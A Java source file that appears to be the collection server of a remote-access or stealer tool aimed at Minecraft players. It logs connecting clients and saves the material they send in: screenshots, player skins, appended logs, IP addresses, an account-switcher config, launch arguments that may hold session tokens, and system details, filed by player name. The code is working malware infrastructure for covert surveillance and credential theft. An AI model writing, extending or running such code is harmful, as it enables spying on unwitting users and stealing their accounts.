package me.soda.witch.server.server;

import com.google.gson.Gson;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.socket.Connection;
import me.soda.witch.shared.socket.TcpServer;
import me.soda.witch.shared.socket.messages.Message;
import me.soda.witch.shared.socket.messages.messages.*;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.ConcurrentHashMap;

public class Server extends TcpServer {
    private static int clientIndex = 0;
    public final String name;
    public final ConcurrentHashMap<Connection, Info> clientMap = new ConcurrentHashMap<>();
    public final SendUtil sendUtil = new SendUtil();

    public Server(int port, String name) throws IOException {
        super(port);
        this.name = name;
    }

    private static String getFileName(String prefix, String suffix, String afterPrefix, boolean time) {
        return String.format("%s-%s%s.%s", prefix, afterPrefix, time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "", suffix);
    }

    public static void log(String string) {
        System.out.println(LocalTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss")) + ": " + string);
    }

    @Override
    public void onOpen(Connection conn) {
        String address = conn.getRemoteSocketAddress().getAddress().getHostAddress();
        log("Client connected: " + address + " ID: " + clientIndex);
        clientMap.put(conn, new Info(clientIndex));
        clientIndex++;
    }

    @Override
    public void onMessage(Connection conn, Message message) {
        Info info = clientMap.get(conn);
        int id = info.index;
        log("* Received message: " + message.data.getClass().getName() + " From ID " + id);
        Gson GSON = new Gson();
        try {
            if (message.data instanceof ByteData data) {
                switch (data.messageID) {
                    case "screenshot", "screenshot2" -> {
                        File file = new File("data/screenshots", getFileName(data.messageID + "id", "png", String.valueOf(id), true));
                        FileUtil.write(file, data.bytes());
                    }
                    case "skin" -> {
                        String playerName = info.playerData.playerName;
                        File file = new File("data/skins", getFileName(playerName, "png", String.valueOf(id), false));
                        FileUtil.write(file, data.bytes());
                    }
                }
            }else if(message.data instanceof SingleStringData data) {
                if (data.data().equals("server_name")) {
                    sendUtil.trySend(conn, "server_name", name);
                }
            }
            else if (message.data instanceof StringData data) {
                switch (data.messageID()) {
                    case "logging" -> {
                        File file = new File("data/logging", getFileName("id", "log", String.valueOf(id), false));
                        String oldInfo = new String(FileUtil.read(file), StandardCharsets.UTF_8);
                        FileUtil.write(file, (oldInfo + data.data()).getBytes(StandardCharsets.UTF_8));
                    }
                    case "ip" -> info.ip = data.data();
                    case "iasconfig", "runargs", "systeminfo", "props" -> {
                        File file = new File("data/data", getFileName(data.messageID(), "txt", info.playerData.playerName, true));
                        FileUtil.write(file, data.data());
                    }
                }
            } else if (message.data instanceof PlayerData data) {
                info.playerData = data;
            } else {
                log("Message: " + message.data.getClass().getName() + " " + GSON.toJson(message.data));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onClose(Connection conn, DisconnectData disconnectData) {
        log("Client disconnected: ID: " + clientMap.get(conn).index);
        clientMap.remove(conn);
    }
}
